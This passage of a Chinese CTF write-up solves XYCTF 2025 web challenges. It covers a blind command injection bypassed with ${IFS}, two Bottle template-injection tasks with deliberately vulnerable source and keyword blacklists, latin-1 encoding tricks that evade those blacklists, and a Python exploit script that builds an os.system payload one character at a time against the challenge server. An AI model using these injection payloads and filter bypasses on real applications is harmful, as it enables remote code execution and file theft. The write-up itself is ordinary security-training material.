class="hljs-built_in">print</span>(secret)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><blockquote><p>secret：dtfrtkcc0czkoua9s</p></blockquote><p>命令执行无回显并将空格禁用，利用${IFS}绕过和&gt;重定向</p><blockquote><p>cat${IFS}&#x2F;f*${IFS}&gt;flag.txt</p></blockquote><p>再访问&#x2F;flag.txt即可</p><h2 id="出题人已疯"><a href="#出题人已疯" class="headerlink" title="出题人已疯"></a>出题人已疯</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@File    :   app.py</span><br><span class="hljs-string">@Time    :   2025/03/29 15:52:17</span><br><span class="hljs-string">@Author  :   LamentXU </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> bottle<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">flag in /flag</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-meta">@bottle.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, World!&#x27;</span><br><span class="hljs-meta">@bottle.route(<span class="hljs-params"><span class="hljs-string">&#x27;/attack&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>():<br>    payload = bottle.request.query.get(<span class="hljs-string">&#x27;payload&#x27;</span>)<br>    <span class="hljs-keyword">if</span> payload <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(payload) &lt; <span class="hljs-number">25</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;open&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> payload <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;\\&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> payload:<br>        <span class="hljs-keyword">return</span> bottle.template(<span class="hljs-string">&#x27;hello &#x27;</span>+payload)<br>    <span class="hljs-keyword">else</span>:<br>        bottle.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&#x27;Invalid payload&#x27;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    bottle.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>明显的bottle模板注入，但限制了长度并禁用了open和\</p><p>可以用latin-1绕过对open的禁用（但似乎只有少数字符在在部分情况下才会被正确解析为对应的ascii码，参考博客：<a href="https://www.cnblogs.com/LAMENTXU/articles/18805019%EF%BC%89">https://www.cnblogs.com/LAMENTXU/articles/18805019）</a></p><blockquote><p>Latin-1编码，也称为ISO-8859-1，是一种单字节字符集，它扩展了ASCII编码以包括西欧语言的字符。Latin-1编码的范围是0x00-0xFF，其中0x00-0x7F之间的编码与ASCII完全一致，而0x80-0xFF之间则包含了控制字符和文字符号。这种编码方式在支持Latin-1的系统中传输和存储其他任何编码的字节流时，不会丢失信息，这使得它在某些数据库系统中，如MySQL中被默认使用。在处理Latin-1编码时，需要注意的是，尽管它兼容ASCII编码，但它并不支持所有语言的字符。</p></blockquote><p>将o替换成%ba即可</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">payload：/attack?payload=</span><span class="hljs-template-variable">&#123;&#123;%<span class="hljs-name">bapen</span>(<span class="hljs-name">&#x27;/flag&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/11/xyctf2025-web%E5%A4%8D%E7%8E%B0/crazy1.png"></p><p>也可以用bottle的模板语法，将payload字符逐个注入，绕过长度限制，然后执行</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://gz.imxbt.cn:20187/attack&quot;</span><br>payload = <span class="hljs-string">f&quot;__import__(&#x27;os&#x27;).system(&#x27;cat /f* &gt; hah&#x27;)&quot;</span><br><br>flag = <span class="hljs-literal">True</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload:<br>    <span class="hljs-keyword">if</span> flag:<br>        tmp = <span class="hljs-string">f&#x27;\n%import os;os.a=&quot;<span class="hljs-subst">&#123;i&#125;</span>&quot;&#x27;</span><br>        flag = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        tmp = <span class="hljs-string">f&#x27;\n%import os;os.a+=&quot;<span class="hljs-subst">&#123;i&#125;</span>&quot;&#x27;</span><br>    r = requests.get(url, params=&#123;<span class="hljs-string">&quot;payload&quot;</span>: tmp&#125;)<br><br>r = requests.get(url, params=&#123;<span class="hljs-string">&quot;payload&quot;</span>: <span class="hljs-string">&quot;\n%import os;eval(os.a)&quot;</span>&#125;)<br>r = requests.get(url, params=&#123;<span class="hljs-string">&quot;payload&quot;</span>: <span class="hljs-string">&quot;\n%include(&#x27;hah&#x27;)&quot;</span>&#125;).text<br><br><span class="hljs-built_in">print</span>(r)<br></code></pre></td></tr></table></figure><h2 id="出题人又疯"><a href="#出题人又疯" class="headerlink" title="出题人又疯"></a>出题人又疯</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@File    :   app.py</span><br><span class="hljs-string">@Time    :   2025/03/29 15:52:17</span><br><span class="hljs-string">@Author  :   LamentXU </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> bottle<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">flag in /flag</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-meta">@bottle.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, World!&#x27;</span><br>blacklist = [<br>    <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;import&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span> , <span class="hljs-string">&#x27;read&#x27;</span><br>]<br><span class="hljs-meta">@bottle.route(<span class="hljs-params"><span class="hljs-string">&#x27;/attack&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>():<br>    payload = bottle.request.query.get(<span class="hljs-string">&#x27;payload&#x27;</span>)<br>    <span class="hljs-keyword">if</span> payload <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(payload) &lt; <span class="hljs-number">25</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">all</span>(c <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> payload <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist):<br>        <span class="hljs-built_in">print</span>(payload)<br>        <span class="hljs-keyword">return</span> bottle.template(<span class="hljs-string">&#x27;hello &#x27;</span>+payload)<br>    <span class="hljs-keyword">else</span>:<br>        bottle.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&#x27;Invalid payload&#x27;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    bottle.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>较上一题，将read及其一些其他字符禁用</p><p>继续利用latin-1绕过</p><p>将o替换成%ba，将a替换成%aa</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">payload：/attack?payload=</span><span class="hljs-template-variable">&#123;&#123;%<span class="hljs-name">bapen</span>(<span class="hljs-name">&#x27;/flag&#x27;</span>).re%aad()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/11/xyctf2025-web%E5%A4%8D%E7%8E%B0/crazy_again.png"></p><p>参考博客：</p><p><a href="https://www.cnblogs.com/LAMENTXU/articles/18730353">https://www.cnblogs.com/LAMENTXU/articles/18730353</a></p><p><a href="https://blog.csdn.net/oyf3085227433/article/details/147075769">https://blog.csdn.net/oyf3085227433/article/details/147075769</a></p><p><a href="https://www.cnblogs.com/ddd-flag/articles/18816057">https://www.cnblogs.com/ddd-flag/articles/18816057</a></p><p><a href="https://www.mcso.top/all/">https://www.mcso.top/all/</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
